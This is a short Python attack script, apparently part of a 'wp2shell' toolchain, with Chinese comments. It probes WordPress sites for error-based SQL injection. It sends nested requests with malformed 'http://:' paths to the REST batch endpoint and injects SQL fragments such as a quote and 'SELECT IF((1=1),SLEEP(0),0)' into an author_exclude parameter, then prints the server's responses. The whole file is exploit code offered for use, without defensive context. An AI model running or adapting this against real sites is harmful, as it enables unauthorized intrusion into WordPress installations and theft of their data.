#!/usr/bin/env python3
"""wp2shell_err.py - 错误型注入验证 (不用SLEEP, 看SQL错误)
"""
import urllib.request, json, sys, urllib.parse

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0",
      "Content-Type": "application/json"}

def send_batch(base, requests, timeout=15):
    batch_url = base + "/?rest_route=/batch/v1"
    payload = {
        "requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]
    }
    req = urllib.request.Request(batch_url, data=json.dumps(payload).encode(), headers=UA, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "ignore")

if __name__ == "__main__":
    base = sys.argv[1].rstrip("/")
    # 错误型注入: 语法错误应导致500/错误响应
    tests = [
        ("syntax-error", "SELECT IF((1=1),SLEEP(0),0)"),
        ("quote-test", "1'"),
        ("subquery", "(SELECT 1)"),
        ("normal", "0"),
    ]
    for name, cond in tests:
        try:
            body = send_batch(base, [
                {"method": "GET", "path": "http://:"},
                {"method": "GET", "path": "/wp/v2/categories?" + urllib.parse.urlencode(
                    {"author_exclude": cond})},
                {"method": "GET", "path": "/wp/v2/posts"},
            ])
            print("%s: len=%d body=%s" % (name, len(body), body[:200].replace("\n", " ")), flush=True)
        except urllib.error.HTTPError as e:
            print("%s: HTTP %d body=%s" % (name, e.code, e.read(300).decode("utf-8", "ignore")[:200]), flush=True)
        except Exception as e:
            print("%s: ERR %s" % (name, repr(e)[:100]), flush=True)
